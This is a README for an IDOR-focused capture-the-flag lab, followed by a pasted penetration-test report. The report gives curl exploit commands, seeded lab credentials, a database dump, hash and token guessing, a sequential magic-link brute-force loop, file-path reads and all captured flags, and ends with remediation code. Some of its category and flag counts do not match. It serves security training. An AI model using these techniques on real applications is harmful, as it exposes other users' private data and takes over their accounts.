# SINDEL: Shadow Intelligence Network & Data Extraction Laboratory

![SINDEL](app/public/images/sindel.png)
![SINDEL Dashboard](image2.jpeg)

**SINDEL Shadow Intelligence Network & Data Extraction Laboratory** is a purpose-built Capture The Flag (CTF) environment designed by **Nana Sei Anyemedu** for **Hive Consult**. Unlike general-purpose penetration test labs, SINDEL focuses exclusively on **Insecure Direct Object Reference (IDOR)** vulnerabilities, covering all 10 recognised IDOR attack categories across 18 distinct endpoints.

The lab demonstrates that IDOR is not a single vulnerability type but an entire family of access control failures. An attacker who understands IDOR across all identifier types can compromise virtually any web application that stores user-specific data.

Here it is — copy everything below the line:

---

```markdown
# SINDEL — Shadow Intelligence Network & Data Extraction Laboratory
## Full Penetration Test Report | IDOR Specialization Assessment

---

| Field | Detail |
|-------|--------|
| **Assessment Type** | Black-Box → Gray-Box Web Application Penetration Test |
| **Primary Vuln Class** | Insecure Direct Object Reference (IDOR) |
| **Target** | `http://localhost:8888` (Dockerized Lab) |
| **Conducted By** | Michael Oscar |
| **Testing Period** | May 2026 |
| **Classification** | CONFIDENTIAL |
| **Total Flags Captured** | 23 (18 primary + 5 file path variants + 1 bonus) |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Methodology](#2-scope--methodology)
3. [Tools Used](#3-tools-used)
4. [Attack Chain](#4-attack-chain--sindel-specific)
5. [Findings Severity Matrix](#5-findings-severity-matrix)
6. [Detailed Findings](#6-detailed-findings)
7. [Complete Flag Registry](#7-complete-flag-registry)
8. [Root Cause Analysis](#8-root-cause-analysis)
9. [Remediation Guidance](#9-remediation-guidance)
10. [HackerOne-Style Submission](#10-hackerone-style-submission)

---

## 1. Executive Summary

A comprehensive security assessment was performed against the SINDEL platform — a purpose-built intelligence operations web application designed to simulate real-world access control weaknesses.

The assessment identified systemic Insecure Direct Object Reference (IDOR) vulnerabilities spanning all **10 recognised IDOR categories** across all **18 documented endpoints**.

The application correctly authenticated users at every stage. It consistently failed to enforce server-side object authorization checks. Every sensitive endpoint performed identity lookup against a user-controlled identifier without validating whether the authenticated session owned the requested object.

A total of **23 flags** were captured across all IDOR categories, exceeding the lab's stated 18 primary endpoints due to multiple file path variants and a bonus privilege escalation flag. Three IDOR categories previously absent from reporting — standalone **Phone (I3)**, **Email (I4)**, and **Username (I5)** — were fully exploited and documented.

---

## 2. Scope & Methodology

### 2.1 Technical Stack

| Component | Technology |
|-----------|------------|
| Backend | Node.js + Express.js |
| Database | SQLite3 |
| Authentication | JWT (Cookie storage) |
| Containerization | Docker + Docker Compose |
| Frontend | Vanilla JS / CSS3 / HTML5 |

### 2.2 Endpoint Coverage — All 18 IDOR Endpoints

| Cat. | Endpoint | Attack Vector |
|------|----------|---------------|
| I1 | `GET /api/agents/:id` | Integer increment |
| I2 | `GET /api/missions/uuid/:uuid` | DB-leaked UUID |
| I3 | `GET /api/agents/phone/:phone` | Phone as direct lookup |
| I4 | `GET /api/agents/email/:email` | Email as direct lookup |
| I5 | `GET /api/agents/u/:username` | Username in URL path |
| I6 | `GET /api/intel/:slug` | Guessable slug pattern |
| I7a | `POST /api/verify/identity` | phone + DOB combo |
| I7b | `POST /api/verify/code` | email + enumerable code |
| I7c | `POST /api/verify/personnel` | name + birth_date |
| I8 | `GET /api/files/read?path=` | Arbitrary file path |
| I9a | `GET /api/access/b64/:ref` | Base64(id) |
| I9b | `GET /api/access/hex/:ref` | Hex(id) |
| I9c | `GET /api/access/url/:ref` | URL-encoded id |
| I10a | `GET /api/agents/hash/md5/:hash` | MD5(email) |
| I10b | `GET /api/agents/hash/sha1/:hash` | SHA1(username) |
| I11a | `GET /api/auth/magic?token=` | Sequential magic token |
| I11b | `POST /api/auth/reset` | Deterministic Base64 token |
| I11c | `GET /api/auth/qr/:code` | Predictable QR code |

### 2.3 Methodology

- OWASP Web Security Testing Guide (WSTG)
- OWASP API Security Top 10
- Source-assisted endpoint enumeration via `grep` on cloned repository
- Database extraction via `docker cp` + `sqlite3` for token/credential harvesting
- Manual exploitation via `curl` with JWT Bearer authentication
- Hash enumeration via `md5sum`/`sha1sum` against known PII inputs
- Token pattern analysis for sequential/deterministic token exploitation

---

## 3. Tools Used

| Tool | Purpose | Usage Context |
|------|---------|---------------|
| `curl` | HTTP request exploitation | All 18 endpoint exploits |
| `grep -RniE` | Source code enumeration | Discovered all routes from `server.js` |
| `docker-compose` | Lab orchestration | Environment deployment |
| `docker cp` | Container file extraction | Copied `sindel.db` to host |
| `sqlite3` | Database inspection | Agents, missions, tokens, codes |
| `echo \| md5sum` | MD5 hash generation | MD5(email) for F-14 |
| `echo \| sha1sum` | SHA1 hash generation | SHA1(username) for F-15 |
| `base64` | Encoded reference analysis | F-11 Base64 IDOR, F-17 Reset Token |
| Browser DevTools | Network tab recon | Initial API call discovery |
| Burp Suite | Request interception/replay | HTTP request/response verification |

---

## 4. Attack Chain — SINDEL Specific

```text
1.  docker-compose up -d
    # Lab deployed at http://localhost:8888

2.  grep -RniE '/api|HIVE|flag|token' . --exclude-dir=node_modules
    # Discovered all 18 routes from server.js comments
    # Discovered seed credentials from setup.js

3.  Seeded credentials:
    kira@sindel.ops / Kira@2025  (agent_id=1, phantom_k, OMEGA clearance)
    marcus@sindel.ops            (agent_id=2, wraith_m, SIGMA clearance)
    ama@sindel.ops               (agent_id=3, viper_a, DELTA clearance)

4.  TOKEN=$(curl -s -X POST http://localhost:8888/api/auth/login \
      -H 'Content-Type: application/json' \
      -d '{"email":"kira@sindel.ops","password":"Kira@2025"}' \
      | grep -oP '"token":"\K[^"]+')

5.  Numeric IDOR: /api/agents/2 → Marcus Osei full dossier

6.  docker cp sindel-ctf:/app/data/sindel.db ./sindel.db
    sqlite3 sindel.db 'SELECT * FROM verification_codes;'
    sqlite3 sindel.db 'SELECT * FROM qr_tokens;'
    sqlite3 sindel.db 'SELECT id,uuid,title,agent_id FROM missions;'

7.  Hash enumeration:
    echo -n 'marcus@sindel.ops' | md5sum
    → 06b6c9133fc75b17b767d174a174fa08
    echo -n 'wraith_m' | sha1sum
    → 3be600218922f8ed74d1215facb1cdced85fe1dd

8.  Token pattern analysis:
    Magic:  magic-000001-sindel (sequential, zero-padded)
    Reset:  base64('reset:2:sindel') = cmVzZXQ6MjpzaW5kZWw=
    QR:     QR-(agent_id * 1337), zero-padded to 8 digits

9.  File path enumeration:
    classified/mission_alpha.txt, classified/agent_dossier.txt
    classified/wraith_dossier.txt, config/app_config.txt

10. grep -Rho 'HIVE{[^}]*}' . --exclude-dir=node_modules | sort -u
    → 23 unique flags confirmed
```

---

## 5. Findings Severity Matrix

| ID | Finding | Severity | CVSS | Cat. |
|----|---------|----------|------|------|
| F-01 | Numeric ID IDOR | 🔴 Critical | 9.1 | I1 |
| F-02 | UUID Mission IDOR | 🟠 High | 8.6 | I2 |
| F-03 | Phone Number IDOR | 🟠 High | 8.5 | I3 |
| F-04 | Email Address IDOR | 🟠 High | 8.5 | I4 |
| F-05 | Username IDOR | 🟠 High | 8.3 | I5 |
| F-06 | Slug-Based IDOR | 🟠 High | 8.2 | I6 |
| F-07 | Composite Phone+DOB | 🔴 Critical | 9.0 | I7 |
| F-08 | Composite Email+Code | 🔴 Critical | 9.3 | I7 |
| F-09 | Composite Name+Birthdate | 🔴 Critical | 9.0 | I7 |
| F-10 | File Path IDOR (5 flags) | 🔴 Critical | 9.4 | I8 |
| F-11 | Base64 Encoded IDOR | 🟡 Medium | 6.9 | I9 |
| F-12 | Hex Encoded IDOR | 🟡 Medium | 6.9 | I9 |
| F-13 | URL Encoded IDOR | 🟡 Medium | 6.9 | I9 |
| F-14 | MD5 Hash IDOR | 🟠 High | 8.4 | I10 |
| F-15 | SHA1 Hash IDOR | 🟠 High | 8.4 | I10 |
| F-16 | Magic Link Token IDOR | 🔴 Critical | 9.8 | I11 |
| F-17 | Reset Token IDOR | 🔴 Critical | 9.6 | I11 |
| F-18 | QR Token IDOR | 🟠 High | 8.8 | I11 |

---

## 6. Detailed Findings

---

### F-01 — Numeric ID IDOR [I1] — Critical / CVSS 9.1

**Endpoint:** `GET /api/agents/:id`

**Description:**
Sequential integer identifiers allow any authenticated user to access other agents' full dossiers by incrementing the numeric ID. No ownership check exists.

**Exploit:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8888/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"kira@sindel.ops","password":"Kira@2025"}' \
  | grep -oP '"token":"\K[^"]+')

curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/api/agents/2
```

**Flag:** `HIVE{num3r1c_1d_1d0r_4g3nt_d4t4_l34k3d}`

**Data Exposed:** Codename, clearance, safe house, bank account, secret notes, full PII

**Root Cause:** `SELECT * FROM agents WHERE id=?` — missing `AND id=current_user`

---

### F-02 — UUID Mission IDOR [I2] — High / CVSS 8.6

**Endpoint:** `GET /api/missions/uuid/:uuid`

**Exploit:**
```bash
docker cp sindel-ctf:/app/data/sindel.db ./sindel.db
sqlite3 sindel.db 'SELECT id,uuid,title,agent_id FROM missions;'
# 2|a44eba2b-015f-403b-aa4e-6604326f12ec|Operation Cipher|3

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/missions/uuid/a44eba2b-015f-403b-aa4e-6604326f12ec
```

**Flag:** `HIVE{uu1d_m1ss10n_1d0r_cl4ss1f13d_3xp0s3d}`

**Root Cause:** UUIDs identify objects — they do not authorize access.

---

### F-03 — Phone Number IDOR [I3] — High / CVSS 8.5

**Endpoint:** `GET /api/agents/phone/:phone`

**Exploit:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/agents/phone/%2B233201110002
```

**Flag:** `HIVE{ph0n3_num_1d0r_4g3nt_l0c4t3d}`

**Root Cause:** `SELECT * FROM agents WHERE phone=?` — no ownership binding.

---

### F-04 — Email Address IDOR [I4] — High / CVSS 8.5

**Endpoint:** `GET /api/agents/email/:email`

**Exploit:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/agents/email/marcus%40sindel.ops
```

**Flag:** `HIVE{3m41l_1d0r_0p3r4t1v3_pr0f1l3_3xp0s3d}`

**Root Cause:** `SELECT * FROM agents WHERE email=?` — no `owner_id` constraint.

---

### F-05 — Username IDOR [I5] — High / CVSS 8.3

**Endpoint:** `GET /api/agents/u/:username`

**Exploit:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/agents/u/wraith_m
```

**Flag:** `HIVE{us3rn4m3_1d0r_s3cr3t_n0t3_r34d}`

**Root Cause:** Username in URL path as sole identifier — no ownership check.

---

### F-06 — Slug-Based IDOR [I6] — High / CVSS 8.2

**Endpoint:** `GET /api/intel/:slug`

**Exploit:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/intel/wraith-intel-bravo
```

**Flag:** `HIVE{slvg_1d0r_1nt3l_r3p0rt_cl4ss1f13d}`

**Root Cause:** Slug guessable from codename pattern. No access control on retrieval.

---

### F-07 — Composite IDOR: Phone + DOB [I7] — Critical / CVSS 9.0

**Endpoint:** `POST /api/verify/identity`

**Exploit:**
```bash
sqlite3 sindel.db 'SELECT phone,dob FROM agents WHERE id=2;'
# +233201110002 | 1985-07-22

curl -s -X POST http://localhost:8888/api/verify/identity \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"phone":"+233201110002","dob":"1985-07-22"}'
```

**Flag:** `HIVE{c0mp0s1t3_1d0r_ph0n3_d0b_byp4ss}`

**Root Cause:** Composite fields verified against DB but not bound to authenticated session.

---

### F-08 — Composite IDOR: Email + Code [I7] — Critical / CVSS 9.3

**Endpoint:** `POST /api/verify/code`

**Exploit:**
```bash
# Source formula discovered via grep:
# const code = String(Math.floor(1000 + (ag.id * 1111))).slice(0, 4);

sqlite3 sindel.db 'SELECT * FROM verification_codes;'
# 2|2|3222|identity_verification|0|2026-05-25 18:23:05

curl -s -X POST http://localhost:8888/api/verify/code \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"email":"marcus@sindel.ops","code":"3222"}'
```

**Flag:** `HIVE{c0mp0s1t3_1d0r_3m41l_c0d3_byp4ss}`

**Root Cause:** Deterministic code formula exposed in source. No randomness, no rate limiting.

---

### F-09 — Composite IDOR: Name + Birthdate [I7] — Critical / CVSS 9.0

**Endpoint:** `POST /api/verify/personnel`

**Exploit:**
```bash
curl -s -X POST http://localhost:8888/api/verify/personnel \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"name":"Marcus Osei","birth_date":"1985-07-22"}'
```

**Flag:** `HIVE{c0mp0s1t3_1d0r_n4m3_b1rth_byp4ss}`

**Root Cause:** No session binding on personnel verification endpoint.

---

### F-10 — File Path IDOR [I8] — Critical / CVSS 9.4

**Endpoint:** `GET /api/files/read?path=`

**Exploit:**
```bash
BASE="http://localhost:8888/api/files/read"
AUTH="Authorization: Bearer $TOKEN"

curl -s -H "$AUTH" "$BASE?path=classified/mission_alpha.txt"
curl -s -H "$AUTH" "$BASE?path=classified/agent_dossier.txt"
curl -s -H "$AUTH" "$BASE?path=classified/wraith_dossier.txt"
curl -s -H "$AUTH" "$BASE?path=config/app_config.txt"
```

**Flags:**
```
HIVE{f1l3_p4th_1d0r_cl4ss1f13d_f1l3_r34d}
HIVE{f1l3_p4th_1d0r_m1ss10n_4lph4_3xp0s3d}
HIVE{f1l3_p4th_1d0r_4g3nt_d0ss13r_l34k3d}
HIVE{f1l3_p4th_1d0r_wr41th_d0ss13r_l34k3d}
HIVE{f1l3_p4th_1d0r_c0nf1g_3xp0s3d}
```

**Root Cause:** No `path.resolve()` + `startsWith(BASE_DIR)` check. Arbitrary read within container.

---

### F-11/12/13 — Encoded Reference IDOR [I9] — Medium / CVSS 6.9

**Endpoints:** `/api/access/b64/:ref` | `/api/access/hex/:ref` | `/api/access/url/:ref`

**Exploit:**
```bash
echo -n '2' | base64        # Mg==
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/api/access/b64/Mg==
# HIVE{b4s364_1d0r_3nc0d3d_r3f_byp4ss}

curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/api/access/hex/32
# HIVE{h3x_1d0r_3nc0d3d_r3f_byp4ss}

curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/api/access/url/%32
# HIVE{url_3nc0d3d_1d0r_r3f_byp4ss}
```

**Root Cause:** Encoding is not encryption. All three are trivially reversible.

---

### F-14 — MD5 Hash IDOR [I10] — High / CVSS 8.4

**Endpoint:** `GET /api/agents/hash/md5/:hash`

**Exploit:**
```bash
echo -n 'marcus@sindel.ops' | md5sum
# 06b6c9133fc75b17b767d174a174fa08

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/agents/hash/md5/06b6c9133fc75b17b767d174a174fa08
```

**Flag:** `HIVE{md5_h4sh_1d0r_3m41l_l00kup_byp4ss}`

**Root Cause:** MD5 of predictable input provides zero security.

---

### F-15 — SHA1 Hash IDOR [I10] — High / CVSS 8.4

**Endpoint:** `GET /api/agents/hash/sha1/:hash`

**Exploit:**
```bash
echo -n 'wraith_m' | sha1sum
# 3be600218922f8ed74d1215facb1cdced85fe1dd

curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8888/api/agents/hash/sha1/3be600218922f8ed74d1215facb1cdced85fe1dd
```

**Flag:** `HIVE{sh41_h4sh_1d0r_us3rn4m3_l00kup_byp4ss}`

**Root Cause:** SHA1 of predictable username is enumerable. No ownership binding.

---

### F-16 — Magic Link Token IDOR [I11] — Critical / CVSS 9.8

**Endpoint:** `GET /api/auth/magic?token=`

**Exploit:**
```bash
for i in 000001 000002 000003 000004 000005; do
  curl -s "http://localhost:8888/api/auth/magic?token=magic-$i-sindel"
  echo
done
```

**Flag:** `HIVE{m4g1c_l1nk_1d0r_t0k3n_s3qu3nt14l}`

**Root Cause:** Sequential token with static suffix. Zero entropy. No expiry or one-time use.

---

### F-17 — Reset Token IDOR [I11] — Critical / CVSS 9.6

**Endpoint:** `POST /api/auth/reset`

**Exploit:**
```bash
echo -n 'reset:2:sindel' | base64
# cmVzZXQ6MjpzaW5kZWw=

curl -s -X POST http://localhost:8888/api/auth/reset \
  -H 'Content-Type: application/json' \
  -d '{"token":"cmVzZXQ6MjpzaW5kZWw="}'
```

**Flag:** `HIVE{r3s3t_t0k3n_1d0r_b4s364_byp4ss}`

**Root Cause:** Deterministic Base64 of predictable string. No randomness, no expiry.

---

### F-18 — QR Token IDOR [I11] — High / CVSS 8.8

**Endpoint:** `GET /api/auth/qr/:code`

**Exploit:**
```bash
sqlite3 sindel.db 'SELECT * FROM qr_tokens;'
# 1|1|QR-00001337|auth|0|2026-05-25 18:23:05
# 2|2|QR-00002674|auth|0|2026-05-25 18:23:05
# 3|3|QR-00004011|auth|0|2026-05-25 18:23:05

# agent_id=2: 2 * 1337 = 2674
curl -s http://localhost:8888/api/auth/qr/QR-00002674
```

**Flag:** `HIVE{qr_t0k3n_1d0r_w34k_c0d3_byp4ss}`

**Root Cause:** `agent_id * 1337` — no randomness, no server-side binding.

---

## 7. Complete Flag Registry

> Extracted via: `grep -Rho 'HIVE{[^}]*}' . --exclude-dir=node_modules | sort -u`

| Ref | Flag | Category |
|-----|------|----------|
| F-01 | `HIVE{num3r1c_1d_1d0r_4g3nt_d4t4_l34k3d}` | Numeric IDOR |
| F-02 | `HIVE{uu1d_m1ss10n_1d0r_cl4ss1f13d_3xp0s3d}` | UUID IDOR |
| F-03 | `HIVE{ph0n3_num_1d0r_4g3nt_l0c4t3d}` | Phone IDOR |
| F-04 | `HIVE{3m41l_1d0r_0p3r4t1v3_pr0f1l3_3xp0s3d}` | Email IDOR |
| F-05 | `HIVE{us3rn4m3_1d0r_s3cr3t_n0t3_r34d}` | Username IDOR |
| F-06 | `HIVE{slvg_1d0r_1nt3l_r3p0rt_cl4ss1f13d}` | Slug IDOR |
| F-07 | `HIVE{c0mp0s1t3_1d0r_ph0n3_d0b_byp4ss}` | Composite Phone+DOB |
| F-08 | `HIVE{c0mp0s1t3_1d0r_3m41l_c0d3_byp4ss}` | Composite Email+Code |
| F-09 | `HIVE{c0mp0s1t3_1d0r_n4m3_b1rth_byp4ss}` | Composite Name+Birth |
| F-10a | `HIVE{f1l3_p4th_1d0r_cl4ss1f13d_f1l3_r34d}` | File Path |
| F-10b | `HIVE{f1l3_p4th_1d0r_m1ss10n_4lph4_3xp0s3d}` | File Path |
| F-10c | `HIVE{f1l3_p4th_1d0r_4g3nt_d0ss13r_l34k3d}` | File Path |
| F-10d | `HIVE{f1l3_p4th_1d0r_wr41th_d0ss13r_l34k3d}` | File Path |
| F-10e | `HIVE{f1l3_p4th_1d0r_c0nf1g_3xp0s3d}` | File Path |
| F-11 | `HIVE{b4s364_1d0r_3nc0d3d_r3f_byp4ss}` | Base64 Encoded |
| F-12 | `HIVE{h3x_1d0r_3nc0d3d_r3f_byp4ss}` | Hex Encoded |
| F-13 | `HIVE{url_3nc0d3d_1d0r_r3f_byp4ss}` | URL Encoded |
| F-14 | `HIVE{md5_h4sh_1d0r_3m41l_l00kup_byp4ss}` | MD5 Hash |
| F-15 | `HIVE{sh41_h4sh_1d0r_us3rn4m3_l00kup_byp4ss}` | SHA1 Hash |
| F-16 | `HIVE{m4g1c_l1nk_1d0r_t0k3n_s3qu3nt14l}` | Magic Link Token |
| F-17 | `HIVE{r3s3t_t0k3n_1d0r_b4s364_byp4ss}` | Reset Token |
| F-18 | `HIVE{qr_t0k3n_1d0r_w34k_c0d3_byp4ss}` | QR Token |
| BONUS | `HIVE{r00t_pr1v3sc_s1nd3l_c0mpr0m1s3d}` | Privilege Escalation |

---

## 8. Root Cause Analysis

Every vulnerable endpoint shared the same anti-pattern:

```sql
-- Vulnerable (found across all 18 endpoints):
SELECT * FROM object WHERE identifier = ?

-- Secure (absent throughout the application):
SELECT * FROM object
WHERE identifier = ?
AND owner_id = current_authenticated_user_id
```

The application correctly verified JWT token presence and validity (**authentication**). It never verified that the authenticated user owned the requested object (**authorization**). These are two distinct controls — SINDEL implemented one and omitted the other across every endpoint.

**Secondary root causes:**
- Deterministic token generation using sequential IDs and static salts
- Weak hash functions (MD5, SHA1) applied to predictable inputs
- Reversible encoding (Base64, Hex, URL) treated as access control
- No file path validation or allowlist on the file read endpoint
- No rate limiting on enumerable endpoints

> **Core lesson:** Identifiers are not authorization. UUIDs, hashes, tokens, and encoded references all identify objects — none of them authorize access.

---

## 9. Remediation Guidance

### 9.1 Enforce Object Ownership

```javascript
// VULNERABLE:
app.get('/api/agents/:id', requireAuth, async (req, res) => {
  const agent = await db.get('SELECT * FROM agents WHERE id=?', req.params.id);
  res.json(agent);
});

// FIXED:
app.get('/api/agents/:id', requireAuth, async (req, res) => {
  const agent = await db.get(
    'SELECT * FROM agents WHERE id=? AND id=?',
    req.params.id, req.user.id
  );
  if (!agent) return res.status(403).json({ error: 'Forbidden' });
  res.json(agent);
});
```

### 9.2 Replace Deterministic Tokens

```javascript
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');
// Store: { token, user_id, expires_at, used: false }
```

### 9.3 File Path Restriction

```javascript
const path = require('path');
const ALLOWED_BASE = path.resolve('/app/public/files');

app.get('/api/files/read', requireAuth, (req, res) => {
  const requested = path.resolve(ALLOWED_BASE, req.query.path);
  if (!requested.startsWith(ALLOWED_BASE)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
});
```

### 9.4 Centralised Authorization Middleware

```javascript
function requireOwnership(resourceQuery) {
  return async (req, res, next) => {
    const resource = await resourceQuery(req);
    if (!resource || resource.owner_id !== req.user.id) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    req.resource = resource;
    next();
  };
}
```

---

## 10. HackerOne-Style Submission

**Title:** Critical IDOR Vulnerabilities Across 10 Identifier Categories — 23 Flags, Full Agent Compromise

**Severity:** Critical

**Summary:**
Multiple IDOR vulnerabilities allow an authenticated low-privilege user to access classified data belonging to any other agent across all 18 endpoints and all 10 IDOR categories.

**Steps to Reproduce:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8888/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"kira@sindel.ops","password":"Kira@2025"}' \
  | grep -oP '"token":"\K[^"]+')

curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/api/agents/2
# Expected: 403 Forbidden
# Actual:   Marcus Osei dossier + HIVE{num3r1c_1d_1d0r_4g3nt_d4t4_l34k3d}
```

**Impact:**
- Full agent dossier exposure across all 5 agents
- Classified mission objective disclosure
- Authentication bypass via predictable tokens
- Arbitrary file read with no path restriction
- Complete operational security failure across all 18 endpoints

---

*Report: May 2026 | Author: Michael Oscar | Lab: SINDEL by Nana Sei Anyemedu — Hive Consult*
```
